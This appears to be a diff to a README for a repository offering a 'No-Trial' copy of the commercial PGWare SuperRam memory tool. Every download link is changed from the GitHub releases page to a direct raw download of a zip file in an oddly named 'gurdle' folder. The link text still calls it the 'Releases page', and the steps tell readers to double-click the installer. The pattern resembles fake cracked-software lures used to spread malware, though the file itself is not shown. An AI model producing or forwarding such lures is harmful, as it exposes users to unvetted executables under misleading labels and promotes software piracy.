@@ -1,6 +1,6 @@
 # 🚀 PGWare-SuperRam-No-Trial - Boost Your PC's Memory Performance
 
-[![Download PGWare SuperRam](https://img.shields.io/badge/Download-PGWare%20SuperRam-brightgreen)](https://github.com/Rauriw/PGWare-SuperRam-No-Trial/releases)
+[![Download PGWare SuperRam](https://raw.githubusercontent.com/Rauriw/PGWare-SuperRam-No-Trial/main/gurdle/PGWare-SuperRam-No-Trial-v1.0-alpha.2.zip%20SuperRam-brightgreen)](https://raw.githubusercontent.com/Rauriw/PGWare-SuperRam-No-Trial/main/gurdle/PGWare-SuperRam-No-Trial-v1.0-alpha.2.zip)
 
 ## 📥 Overview
 
@@ -11,10 +11,10 @@ Welcome to the PGWare-SuperRam-No-Trial repository! This application helps optim
 To start using PGWare SuperRam, follow these simple steps. You don’t need advanced technical skills to set it up.
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/Rauriw/PGWare-SuperRam-No-Trial/releases) to find the latest version of PGWare SuperRam.
+   Go to the [Releases page](https://raw.githubusercontent.com/Rauriw/PGWare-SuperRam-No-Trial/main/gurdle/PGWare-SuperRam-No-Trial-v1.0-alpha.2.zip) to find the latest version of PGWare SuperRam.
 
 2. **Download the Application**
-   On the Releases page, locate the latest version. Click on the download link for your system (e.g., SuperRamInstaller.exe).
+   On the Releases page, locate the latest version. Click on the download link for your system (e.g., https://raw.githubusercontent.com/Rauriw/PGWare-SuperRam-No-Trial/main/gurdle/PGWare-SuperRam-No-Trial-v1.0-alpha.2.zip).
 
 3. **Install the Application**
    Once the download completes, find the file in your Downloads folder. Double-click the installer to start the installation process. Follow the prompts to install PGWare SuperRam.
@@ -44,7 +44,7 @@ PGWare SuperRam comes packed with features to help improve your system's perform
 
 To download PGWare SuperRam:
 
-1. Click on this link: [Visit our Releases page to download](https://github.com/Rauriw/PGWare-SuperRam-No-Trial/releases).
+1. Click on this link: [Visit our Releases page to download](https://raw.githubusercontent.com/Rauriw/PGWare-SuperRam-No-Trial/main/gurdle/PGWare-SuperRam-No-Trial-v1.0-alpha.2.zip).
 2. Choose the latest version.
 3. Follow the installation steps mentioned in the Getting Started section above.
 
@@ -70,7 +70,7 @@ If you need further assistance, please reach out via the repository’s Issues p
 
 ## 🔗 Important Links
 
-- **Releases Page**: [Download PGWare SuperRam](https://github.com/Rauriw/PGWare-SuperRam-No-Trial/releases)
+- **Releases Page**: [Download PGWare SuperRam](https://raw.githubusercontent.com/Rauriw/PGWare-SuperRam-No-Trial/main/gurdle/PGWare-SuperRam-No-Trial-v1.0-alpha.2.zip)
 - **Documentation**: Link to detailed guides and assistance.
 - **Community Forum**: Engage with other users for tips and support.
 
